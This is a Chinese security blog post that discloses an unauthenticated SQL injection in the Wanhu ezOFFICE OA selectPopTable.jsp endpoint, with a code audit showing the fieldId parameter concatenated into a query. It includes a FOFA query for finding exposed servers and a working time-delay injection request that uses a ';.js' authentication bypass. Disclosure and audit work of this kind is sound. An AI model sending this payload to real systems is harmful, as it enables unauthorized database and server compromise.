---
title: "万户OA selectPopTable.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-selectPopTable-sqli.html
asset_dir: assets/万户oa-selectpoptable.jsp-sql注入漏洞
---

# 万户OA selectPopTable.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/14 08:12
* 1153浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

万户网络

sql

database


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE platform/custom/custom\_database/dropdownselect/selectPopTable.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/platform/custom/custom_database/dropdownselect/selectPopTable.jsp;.js?fieldId=1%3Bwaitfor%20delay%270%3A0%3A4%27 HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 4 秒

代码安全审计

[[![万户OA selectPopTable.jsp SQL注入漏洞](images/img-001-d9bcad83e0c1.png)](https://mrxn.net/content/uploadfile/202501/be5a1736770468.png)](https://mrxn.net/content/uploadfile/202501/be5a1736770468.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

platform/custom/custom\_database/dropdownselect/selectPopTable.jsp 主要业务逻辑代码如下，非常简单！

深入探索

JSON处理工具

安全研究工具

计算机安全

```
<%
String index = request.getParameter("index");
String fieldId = request.getParameter("fieldId");
String value = request.getParameter("value");
String selectType=request.getParameter("selectType")==null?"":request.getParameter("selectType").toString();
//System.out.println(value);
String[] _table = null;
if("more".equals(selectType)){
    selectType="#";

    if(value != null && !"".equals(value) && !"null".equals(value)){
        String[] _temp = value.split("\\]\\$\\[");
        _table = new String[_temp.length];
        for(int i=0; i<_temp.length; i++){
            if(i==0){
                _table[i] = _temp[i].substring(1) + "]";
            }else{
                _table[i] = "[" + _temp[i];
            }
            //System.out.println(_table[i]);
        }
    }

}else{
    selectType="$";

    if(value != null && !"".equals(value) && !"null".equals(value)){
        String[] _temp = value.split("\\]\\$\\[");
        _table = new String[_temp.length];
        for(int i=0; i<_temp.length; i++){
            if(i==0){
                _table[i] = _temp[i].substring(1) + "]";
            }else{
                _table[i] = "[" + _temp[i];
            }
            //System.out.println(_table[i]);
        }
    }
}

String[][] pryTableList = (String[][])request.getAttribute("pryTableList");

String inType = "0";
String ds = "";
String fieldvalue_filter = "";
String fieldvalue_sql = "";

String field_value = "";

String[][] ret = new UIBD().getFieldExtInfoByFieldId(fieldId);
inType = ret[0][0];
ds = ret[0][1];
if("1".equals(inType)){
    fieldvalue_sql = ret[0][2];
}else{
    fieldvalue_filter = ret[0][2];
}
field_value = request.getParameter("value");//ret[0][3];
%>
```

主要关注 这一行

漏洞修复方案

```
String[][] ret = new UIBD().getFieldExtInfoByFieldId(fieldId);
```

跟进 UIBD `getFieldExtInfoByFieldId` 方法看下

```
public String[][] getFieldExtInfoByFieldId(String fieldId) {
        DbOpt dbopt = null;
        String[][] result = (String[][])null;
        String sql = "select field_intype, field_ds, field_sql, field_value, field_def_setting, field_show, field_desname, field_name from tfield where field_id=" + fieldId;

        try {
            dbopt = new DbOpt();
            result = dbopt.executeQueryToStrArr2(sql, 8);
```

又是一个明显直接拼接参数进SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，还是这么朴实无华！

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

广告与营销

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.0x01 产品简介](#toc-1-)
* [2.0x02 漏洞概述](#toc-2-)
* [3.0x03 复现环境](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [5.漏洞分析](#toc-5-)
* [6.最后](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA selectPopTable.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectPopTable-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-selectPopTable-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALZklEQVR4Aeydi5Lbxg5EdfL//+xrqH24HHBGD3ttsepSFaTZjQZmNCAt7aaS/He73X78Tvxor97DdNc717dC/av8Xl95uy7vaC/1zrve853rfwdrID/9119nOYFtID+ne3sl+saBG7DV9nznrtF1SB8ImtcPo24eogNKGwL3vW3Crwt7/qLLvUPqux+iQ9A+Ha17hvu6bSB78br+3AkcBgKZOoz46ha9GyD18lU9xGe++2HMw8j17xHiUbM3RIdg1+Vir3+mm+8IWQ9G7L7ih4GUeMXnTuDbBgLz6UP0fretOMQPQY+m+9UhPkDp8JlgbUcL1OUiMP0MMi+u6s2/g982kHcWvbzrE/i2gXiXdFwtDbn79EN496/ycPRDNBjRnjDqq976O+pX71z9T/DbBvInm7hqv07gMBCn3vGrZH4Fu7vv57Uu+8ghPnUINy+af8b17bHXwHwNiG5tr+u6eUid/Bnap+Os7jCQmenS/t0JbAOBTB0e42prTr/nIf263vnv1kP6A73lgfc15MDwbQoe894YRr95iA6PUX/hNpAiV3z+BP7zLnkX3bp1kLtAvsqrQ/yd9/qel4v6C9VeRRj3YF31qnjG4XF99Xg3rifEUz8JHgYC86lDdJij7weSl3f0jnmmQ/roF62D5OGI3SMX7dURxl76V7iq1w9jP5hz/YWHgZR4xedO4D/I1PoWIDoEzXtXdK4umoexHsL1ifo7Qvzq3S8v1COWViGH9IIRzYtVUyGHuR+i61th9aro+dIqIH2A2/WE3M712r5lQaZUE9uH21WD+NQhHEY0b92Kw2t1t9vt3gLiv5Off4Nw4Ccb/wLuP1/0PejquhxS133muy7vqB/GfvrgqF9PiKdzElwOBDK9PmX5av/P8pC+ELTPqq7rK65euOpZuX1A9gAjWi9C8p3DqNtb3wq7T164HMiq2aX/3RPYvmXVdCpcrq4rOofHdwUkDyNWr1nYH0Y/hJsXIbq91GcI8ZqDkfcenVv3t9D1IPsCrm9Zt5O9tm9ZfV/wNTVgSztVEbh/k9kMvy7M/6J3DyA9cP0dt4LFBbD1glxrtZdchPggqA9Grt98512H1OuDkT/zV931GVKncKLYBgLzaTpVSB6CvgfzncPcB9F7nfWQPAS7vuKl954w9ijPPvTDYx8kD0F7wMjtZ14uqkPqul75bSBFrvj8CWzfsvpWIFOEoNMU9UPycrH7ug6p0wcj1w/R5fpnCPH2XK+V33H3N+uUIP3kPS+H+GBE6yC63LrOS7+eEE/lJHj4lgWZZk2rou8Tklcvzz7UYfR13RqIT67vGULqZj5IDoIzT2mQfF8b5nrVVEDyECxtH73fPlfXMK+r3PWE1CmcKLaB9KlCptj1ziG+/p70iT0P87ruW9WrQ/rA17+jYk58tac+6yC91UXz8o6QOgj2fOcQH3D9pH472Wt7QiBTWk0fkofg6n1A8jBH+3eE+O1rHqJ3DqNeeWshOQiqd6yaChh9EF65fVgPycv1yEV1EcY6fXvcBrIXr+vPncA2EKfoVlZcHTLtzq0XzcshdTBi9+nveuf69qhH3Of+5Bqy594DorueCNEhaJ15+R63gezF6/pzJ3AYCIzT7FuDMQ8j79OH5NVXCPH19X6HQ3rBa+ieIP6+JkTXJ+qTQ3zA/TfQ6t0nF/UVHgai6cLPnMDhd1k1pQoYpw3hlatYbRfi63mIDiN234pD6szXHirkhRBP6fuoXMVeq+vSZlG5Cki/meeRVrUVeuq6Aub9IDpw/RxyO9lr+yMLvqYELLcJ3P98XBreTMDjfjDmIRyO6NIw5lZ63bUV5jtWbh+Qvt0How7hMKK9IHrvU3wbSJErPn8Ch9/2uiWn2bm6aP4Z6u9onbocchd13bz6DPWIeuTvIox7gZHbz3U6moexDsLNF15PSJ3CieLwLevZ3uA41VmNd4k5SB2M2PPyjr2fefjqp7bCVY+Vv+uQtZ71gfh6/bO68l9PSJ3CieIayImGUVvZPtR9nMRKzmKVVxd7bdflon7I464O4RDUJ+orVHsXYd7bPtV7H+owr9OrT4TRr2+P1xPiaZ0Et4FApgfBvj+IDiPqg+jyjpC8d0PPv6tD+sER7d17Qrxd79x6EVIHQfWOkDyMuPJ1vfg2kCJXfP4Eng6k3z2d+xbUIXeHumheLkL8EFz59HfUX2iurivkYmkVcsia8o7wON/9K15rVpiv6wo5ZB3g+uXi7WSvl38wrIlWQKZZ1xW+H4guXyHEB8HqsQ/rIHm5HvkM9cBYqxfe0+1nvRzGPurdpw7xy/WJ6oVP/8iy6MJ/cwLbzyEuV1OqgExVHcIrVwEj11e5ChjzEN59cnic11e99wGpA7Qc/iOYwP0fGVgH4Raoy0WIzzyMfKVDfPbpPhjzEA5cnyG3k70OnyGQafWpdv7u+7D+x48f9zsYss6rfSB+GPFRPcTr2hDea2DUIdw6/Z1DfOZXCPH1+pn/+gyZncoHte0zpE8PMlX3BuH6RIjeffJnCGN990PyrifqkxdCvD0Hc737OoexDkb+zL/K114rzO/xekL2p3GC68NAanKzcK+QuwSC6s8Q4oegfteSQ/IQVF8hxAesLPfPLNcp7Ebg/i1MHX6PV+992E80J4dxndIPAynxis+dwPYtC47Tqm3BqPcpd141FSu9cvuA9Nffce+taxj9pRnWyl/FXvcq7z7I3mBE9wHR5dbv8XpCPJ2T4PYty/3AOEV1EZJ3quqiOsTXdfMd9Ykw1kO4dfpeQUgtjGgtRJd3hORdG8IhqC5aL4fRB+H6IBy4flK/ney1/ZHlNN0fZGpdl0Py+tVXHEa/PogOI9qvI4w++7yC9tIrF9Uha8hFeKzDmIeR28f14JjfBqL5ws+ewNsDgUzVKfftQ/LqMOcw6vrtC4/z+mcIqYXgs56zHqVZV9f76Lq8ozXqkP2oz/DtgcyaXNr3ncDTn0NcyimL6jCfOkTvfuvUO/a8vKN1XS9uTixtH12Hca893/m+1+9cw7jevsf1hOxP4wTXh59DvBtE9wiZKgTVu69ziH+l2wfie8YhPgjqL4RRg5H3PVRNhTrEDyOW552A1Nu316708l1PSJ3CieIwEMh0IehenaqoDqMPRr7yqXeE1LsOjLz799yavVbXkB4wYuUqIHpd78N+MOZh5PuaV64h9RB0ncLDQF5peHn+3gls37L6EjWtiq5DpgrB8lRAePfLy7MPdUiduZUO8ZmfIcQDwe5xDbHn5V95lRF7HrIeBHVDOATVRftA8sD1u6zbyV7btyynJa72aV6ETLf7zXdd3vOQPl3X31HfDPWak4uQtSDYfRBd/7N89+kXzYsrvfLXZ0idwoli+wyB3BXwGvb38Gjq3Tvj1kPW1wMjVxcheUBpicDwz841wmMd5nn3bB8R5v5X8tcT4imdBLeBOO1nuNo3zO8K+63qXtVXfdQLey8Y91SeR9Hru7fnV9y638lvA1kVX/q/PYHDQCB3FYy42pZ3g6gPxnoIN98R5vne1zqIH46oR7QHxKsuwqjr73l1EcY6CIcR7WOdXFQvPAxE04WfOYFvH0hNucK3U9cVcpjfPebFqqmA0V/as+g95B0hvXu/7pND/HKx13euD1Ivn+G3D2S2yKW9fgJ/PBAYpw5z3u+azvuWYexjHqLDEfWIMHpcE6LrE2HUIdw6fR0hPnUYuboIYx7Cget3WbeTvQ5PiHdDx9W+9a3y6pC7oHMYdfP2FbveefnUOlauoutyyB7KU6Fe1xWQvDqMvDwVEL2uK/SLpe1jph8GounCz5zANhDIdOExrrYJqfMOeOYzr19UF2HeVz8kD19oToSvHBz/txauJUL8ctF+ojrM/TDqMPJeD1yfIbeTvbYn5GT7+r/dzv8AAAD//xRMgOwAAAAGSURBVAMAdtJ0v2a2Z58AAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-selectPopTable-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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